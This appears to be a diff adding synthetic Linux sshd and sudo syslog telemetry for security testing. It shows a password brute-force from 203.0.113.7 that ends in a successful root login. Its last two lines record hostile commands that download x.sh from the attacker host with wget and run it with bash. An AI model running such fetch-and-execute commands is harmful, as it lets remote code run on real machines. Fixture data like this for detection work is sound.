@@ -1,0 +1,13 @@
+# Linux sshd + sudo authentication telemetry (syslog format).
+Jun 24 14:02:55 web01 sshd[2280]: Accepted password for deploy from 10.0.0.30 port 49002 ssh2
+Jun 24 14:03:11 web01 sshd[2291]: Failed password for root from 203.0.113.7 port 51514 ssh2
+Jun 24 14:03:13 web01 sshd[2292]: Failed password for root from 203.0.113.7 port 51520 ssh2
+Jun 24 14:03:15 web01 sshd[2293]: Failed password for invalid user admin from 203.0.113.7 port 51526 ssh2
+Jun 24 14:03:18 web01 sshd[2294]: Failed password for root from 203.0.113.7 port 51532 ssh2
+Jun 24 14:03:21 web01 sshd[2295]: Failed password for invalid user oracle from 203.0.113.7 port 51538 ssh2
+Jun 24 14:03:24 web01 sshd[2296]: Failed password for root from 203.0.113.7 port 51544 ssh2
+Jun 24 14:03:27 web01 sshd[2297]: Failed password for postgres from 203.0.113.7 port 51550 ssh2
+Jun 24 14:03:30 web01 sshd[2298]: Failed password for root from 203.0.113.7 port 51556 ssh2
+Jun 24 14:03:45 web01 sshd[2305]: Accepted password for root from 203.0.113.7 port 51600 ssh2
+Jun 24 14:10:00 web01 sudo[2400]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.7/x.sh
+Jun 24 14:10:05 web01 sudo[2401]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/x.sh
